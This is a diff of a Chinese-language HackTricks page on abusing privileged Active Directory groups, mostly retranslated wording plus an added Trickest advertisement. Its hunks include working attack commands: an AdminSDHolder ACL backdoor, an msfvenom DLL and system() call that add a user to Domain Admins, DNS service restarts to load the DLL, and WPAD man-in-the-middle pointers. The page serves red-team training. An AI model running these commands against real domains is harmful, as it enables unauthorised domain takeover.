@@ -1,8 +1,8 @@
 # 特权组
 
 {% hint style="success" %}
-学习与实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-学习与实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+学习和实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+学习和实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
@@ -15,17 +15,24 @@
 </details>
 {% endhint %}
 
+<figure><img src="/.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
+
+使用 [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection) 轻松构建和 **自动化工作流程**，由世界上 **最先进** 的社区工具提供支持。\
+今天就获取访问权限：
+
+{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=command-injection" %}
+
 ## 具有管理权限的知名组
 
 * **管理员**
 * **域管理员**
 * **企业管理员**
 
-## 账户操作员
+## 帐户操作员
 
-该组有权创建非管理员的账户和组。此外，它还允许本地登录到域控制器 (DC)。
+该组有权创建不是域管理员的帐户和组。此外，它还允许本地登录到域控制器 (DC)。
 
-要识别该组的成员，执行以下命令：
+要识别该组的成员，可以执行以下命令：
 ```powershell
 Get-NetGroupMember -Identity "Account Operators" -Recurse
 ```
@@ -33,11 +40,11 @@ Get-NetGroupMember -Identity "Account Operators" -Recurse
 
 ## AdminSDHolder 组
 
-**AdminSDHolder** 组的访问控制列表 (ACL) 是至关重要的，因为它设置了 Active Directory 中所有“受保护组”的权限，包括高权限组。该机制通过防止未经授权的修改来确保这些组的安全性。
+**AdminSDHolder** 组的访问控制列表 (ACL) 至关重要，因为它为 Active Directory 中所有“受保护组”设置权限，包括高权限组。该机制通过防止未经授权的修改来确保这些组的安全性。
 
-攻击者可以通过修改 **AdminSDHolder** 组的 ACL 来利用这一点，从而授予标准用户完全的权限。这将有效地使该用户对所有受保护组拥有完全控制权。如果该用户的权限被更改或移除，由于系统的设计，他们的权限将在一小时内自动恢复。
+攻击者可以通过修改 **AdminSDHolder** 组的 ACL 来利用这一点，从而授予标准用户完全的权限。这将有效地使该用户对所有受保护组拥有完全控制权。如果该用户的权限被更改或删除，由于系统的设计，他们将在一小时内自动恢复。
 
-审查成员和修改权限的命令包括：
+查看成员和修改权限的命令包括：
 ```powershell
 Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
 Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
@@ -49,17 +56,17 @@ Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityRefer
 
 ## AD 回收站
 
-该组的成员资格允许读取已删除的 Active Directory 对象，这可能会泄露敏感信息：
+加入此组允许读取已删除的 Active Directory 对象，这可能会揭示敏感信息：
 ```bash
 Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
 ```
 ### 域控制器访问
 
-对 DC 上文件的访问受到限制，除非用户是 `Server Operators` 组的一部分，这会改变访问级别。
+对DC上文件的访问受到限制，除非用户是`Server Operators`组的一部分，这会改变访问级别。
 
 ### 权限提升
 
-使用 Sysinternals 的 `PsService` 或 `sc`，可以检查和修改服务权限。例如，`Server Operators` 组对某些服务拥有完全控制权，允许执行任意命令和权限提升：
+使用Sysinternals的`PsService`或`sc`，可以检查和修改服务权限。例如，`Server Operators`组对某些服务拥有完全控制权，允许执行任意命令和权限提升：
 ```cmd
 C:\> .\PsService.exe security AppReadiness
 ```
@@ -67,7 +74,7 @@ C:\> .\PsService.exe security AppReadiness
 
 ## 备份操作员
 
-加入 `Backup Operators` 组可访问 `DC01` 文件系统，因为拥有 `SeBackup` 和 `SeRestore` 权限。这些权限使得文件夹遍历、列出和文件复制成为可能，即使没有明确的权限，也可以使用 `FILE_FLAG_BACKUP_SEMANTICS` 标志。此过程需要使用特定的脚本。
+加入 `Backup Operators` 组可以访问 `DC01` 文件系统，因为拥有 `SeBackup` 和 `SeRestore` 权限。这些权限使得文件夹遍历、列出和文件复制成为可能，即使没有明确的权限，也可以使用 `FILE_FLAG_BACKUP_SEMANTICS` 标志。此过程需要使用特定的脚本。
 
 要列出组成员，请执行：
 ```powershell
@@ -143,7 +150,7 @@ echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\
 
 ## DnsAdmins
 
-**DnsAdmins** 组的成员可以利用他们的特权在 DNS 服务器上加载任意 DLL，通常托管在域控制器上。此能力允许显著的利用潜力。
+**DnsAdmins** 组的成员可以利用他们的特权在 DNS 服务器上加载具有 SYSTEM 特权的任意 DLL，通常托管在域控制器上。这种能力允许显著的利用潜力。
 
 要列出 DnsAdmins 组的成员，请使用：
 ```powershell
@@ -171,20 +178,20 @@ system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /doma
 // Generate DLL with msfvenom
 msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
 ```
-重启DNS服务（这可能需要额外的权限）是加载DLL所必需的：
+重新启动 DNS 服务（这可能需要额外的权限）是加载 DLL 所必需的：
 ```csharp
 sc.exe \\dc01 stop dns
 sc.exe \\dc01 start dns
 ```
-对于此攻击向量的更多细节，请参考 ired.team。
+For more details on this attack vector, refer to ired.team.
 
 #### Mimilib.dll
 使用 mimilib.dll 进行命令执行也是可行的，可以修改它以执行特定命令或反向 shell。[查看此帖子](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)以获取更多信息。
 
-### WPAD 记录用于 MitM
-DnsAdmins 可以操纵 DNS 记录，通过在禁用全局查询阻止列表后创建 WPAD 记录来执行中间人（MitM）攻击。可以使用 Responder 或 Inveigh 等工具进行欺骗和捕获网络流量。
+### WPAD Record for MitM
+DnsAdmins 可以操纵 DNS 记录，通过在禁用全局查询阻止列表后创建 WPAD 记录来执行中间人 (MitM) 攻击。可以使用 Responder 或 Inveigh 等工具进行欺骗和捕获网络流量。
 
-### 事件日志读取器
+### Event Log Readers
 成员可以访问事件日志，可能会找到敏感信息，例如明文密码或命令执行细节：
 ```powershell
 # Get members and search logs for sensitive information
@@ -216,7 +223,7 @@ sc.exe start MozillaMaintenance
 ### 特权利用和命令
 
 #### 打印操作员
-**打印操作员**组的成员被赋予多个特权，包括**`SeLoadDriverPrivilege`**，这使他们能够**在域控制器上本地登录**、关闭它并管理打印机。为了利用这些特权，特别是在**`SeLoadDriverPrivilege`**在未提升的上下文中不可见的情况下，必须绕过用户帐户控制（UAC）。
+**打印操作员**组的成员被赋予多个特权，包括**`SeLoadDriverPrivilege`**，这使他们能够**在域控制器上本地登录**、关闭它并管理打印机。为了利用这些特权，特别是当**`SeLoadDriverPrivilege`**在未提升的上下文中不可见时，绕过用户帐户控制（UAC）是必要的。
 
 要列出该组的成员，可以使用以下PowerShell命令：
 ```powershell
@@ -241,7 +248,7 @@ Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Us
 对于与 **WinRM** 相关的利用技术，应参考特定文档。
 
 #### 服务器操作员
-该组具有在域控制器上执行各种配置的权限，包括备份和恢复权限、改变系统时间和关闭系统。要枚举成员，可以使用以下命令：
+该组具有在域控制器上执行各种配置的权限，包括备份和恢复权限、改变系统时间和关闭系统。要列举成员，可以使用以下命令：
 ```powershell
 Get-NetGroupMember -Identity "Server Operators" -Recurse
 ```
@@ -262,17 +269,24 @@ Get-NetGroupMember -Identity "Server Operators" -Recurse
 * [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
 * [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
 
+<figure><img src="/.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
+
+使用 [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection) 轻松构建和 **自动化工作流程**，由世界上 **最先进** 的社区工具提供支持。\
+今天就获取访问权限：
+
+{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=command-injection" %}
+
 {% hint style="success" %}
-学习与实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-学习与实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+学习和实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+学习和实践 GCP 黑客技术： <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>支持 HackTricks</summary>
 
 * 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
-* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **在 Twitter 上关注** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 分享黑客技巧。
+* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享黑客技巧。
 
 </details>
 {% endhint %}
